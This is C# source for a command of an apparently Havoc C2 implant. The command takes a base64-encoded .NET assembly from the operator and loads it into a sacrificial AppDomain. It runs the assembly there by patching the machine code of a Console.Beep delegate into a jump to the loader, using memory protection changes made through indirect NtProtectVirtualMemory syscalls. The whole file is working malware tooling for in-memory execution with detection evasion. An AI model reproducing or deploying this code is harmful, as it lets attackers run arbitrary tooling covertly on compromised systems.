using System;
using System.Net;
using System.IO;
using System.Threading;
using System.Collections.Generic;
using System.Reflection;
using System.Linq;
using System.Text;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using HavocImplant.NativeUtils;
namespace HavocImplant.AgentFunctions
{
    public class InlineAssembly
    {
        static string output;
        // Darkmelkor
        public static void Run(Implant agent, string taskInfo, int taskId)
        {
            byte[] assembly_bytes = Convert.FromBase64String(taskInfo.Split(new char[] { ';' }, 2)[0].Substring(5));
            Console.WriteLine($"Assembly is {assembly_bytes.Length} bytes long");
            string[] args = taskInfo.Split(new char[] { ';' }, 2)[1].Split(' ');
            string output = "";
            try
            {
                output = Sacrificial.loadAppDomainModule(assembly_bytes, args);
            }
            catch (Exception ex)
            {
            }
            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [inline_assembly]\n" + output).Replace("\\", "\\\\").Replace("\"", "\\\""));
            
        }
    }
        class Sacrificial
    {
        
        static dll ntdll = globalDll.ntdll;
        public static string loadAppDomainModule(Byte[] bMod, string[] args)
        {

            string pathToDll = Assembly.GetExecutingAssembly().CodeBase;
            AppDomainSetup domainSetup = new AppDomainSetup { PrivateBinPath = pathToDll };
            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
            isolationDomain.SetData("str", String.Join(" ", args));
            try
            {
                isolationDomain.Load(bMod);
            }
            catch { }
            var Sleeve = new CrossAppDomainDelegate(Console.Beep);
            var Ace = new CrossAppDomainDelegate(ActivateLoader);

            RuntimeHelpers.PrepareDelegate(Sleeve);
            RuntimeHelpers.PrepareDelegate(Ace);

            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
            var codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
            var codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);

            int[] patch = new int[3];

            patch[0] = 10;
            patch[1] = 11;
            patch[2] = 12;

            object[] protArgs = new object[] { (IntPtr)(-1), codeSleeve, (IntPtr)12, (uint)0x4, (uint)0 };
            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs);

            Marshal.WriteByte(codeSleeve, 0x48);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);

            protArgs[3] = (uint)0x20;
            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs);

            try
            {
                isolationDomain.DoCallBack(Sleeve);
            }
            catch (Exception ex)
            { }
            string output = isolationDomain.GetData("str") as string;
            unloadAppDomain(isolationDomain);
            return output;
        }

        static void ActivateLoader()
        {
            string str = AppDomain.CurrentDomain.GetData("str") as string;
            string output = "";
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscor"))
                {
                    TextWriter realStdOut = Console.Out;
                    TextWriter realStdErr = Console.Error;
                    TextWriter stdOutWriter = new StringWriter();
                    TextWriter stdErrWriter = new StringWriter();
                    Console.SetOut(stdOutWriter);
                    Console.SetError(stdErrWriter);
                    var result = asm.EntryPoint.Invoke(null, new object[] { new string[] {str } });

                    Console.Out.Flush();
                    Console.Error.Flush();
                    Console.SetOut(realStdOut);
                    Console.SetError(realStdErr);

                    output = stdOutWriter.ToString();
                    output += stdErrWriter.ToString();
                }
            }
            AppDomain.CurrentDomain.SetData("str", output);

        }

        public static void unloadAppDomain(AppDomain oDomain)
        {
            AppDomain.Unload(oDomain);
        }

    }

}
